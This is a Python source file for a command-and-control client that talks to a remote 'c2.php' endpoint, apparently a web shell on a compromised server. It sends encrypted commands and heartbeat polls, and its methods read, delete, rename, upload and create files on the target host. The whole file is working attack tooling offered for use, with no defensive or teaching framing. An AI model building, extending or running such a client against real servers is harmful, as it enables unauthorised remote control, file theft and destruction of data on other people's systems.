import requests
import json
from encryption import encrypt_data, decrypt_data

class C2Client:
    def __init__(self):
        pass # No specific initialization needed for now, target details passed per request

    def send_command(self, target, command):
        # Encrypt the command
        encrypted_command = encrypt_data(command, target['api_key'])
        if not encrypted_command:
            return {"status": "error", "message": "Failed to encrypt command."}

        payload = {"key": target['api_key'], "data": encrypted_command}
        try:
            response = requests.post(
                target['url'],
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10 # 10 second timeout for commands
            )
            response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
            
            # Decrypt the response from the server
            response_data = response.json()
            if response_data.get('status') == 'success' and 'data' in response_data:
                decrypted_data = decrypt_data(response_data['data'], target['api_key'])
                if decrypted_data:
                    return json.loads(decrypted_data) # The decrypted data should be a JSON string
                else:
                    return {"status": "error", "message": "Failed to decrypt server response."}
            else:
                # Handle non-encrypted error messages from the server
                return response_data

        except requests.exceptions.Timeout:
            return {"status": "error", "message": "Command timed out."}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "message": "Connection failed."}
        except requests.exceptions.HTTPError as e:
            return {"status": "error", "message": f"HTTP Error: {e.response.status_code} - {e.response.text}"}
        except json.JSONDecodeError:
            return {"status": "error", "message": "Invalid JSON response from server."}
        except Exception as e:
            return {"status": "error", "message": f"An unexpected error occurred: {str(e)}"}

    def send_heartbeat(self, target):
        try:
            response = requests.get(target['url'], timeout=5)
            response.raise_for_status()
            # The c2.php script returns a JSON response for GET requests.
            # We need to parse it to get the status, ip, and uptime.
            return response.json()
        except requests.exceptions.Timeout:
            return {'status': 'error', 'message': 'Heartbeat timed out.'}
        except requests.exceptions.ConnectionError:
            return {'status': 'error', 'message': 'Connection failed.'}
        except requests.exceptions.HTTPError as e:
            return {'status': 'error', 'message': f'HTTP Error: {e.response.status_code}'}
        except json.JSONDecodeError:
            return {'status': 'error', 'message': 'Invalid JSON response from server for heartbeat.'}
        except Exception as e:
            return {'status': 'error', 'message': f'An unexpected error occurred during heartbeat: {str(e)}'}

    def list_directory(self, target, path):
        return self.send_command(target, f"filemanager_ls {path}")

    def get_file_content(self, target, path):
        return self.send_command(target, f"filemanager_cat {path}")

    def delete_path(self, target, path):
        return self.send_command(target, f"filemanager_rm {path}")

    def rename_path(self, target, old_path, new_path):
        return self.send_command(target, f"filemanager_mv {old_path} {new_path}")

    def upload_file(self, target, path, content):
        return self.send_command(target, f"filemanager_upload {path} {content}")

    def create_directory(self, target, path):
        return self.send_command(target, f"filemanager_mkdir {path}")

    def create_file(self, target, path):
        return self.send_command(target, f"filemanager_touch {path}")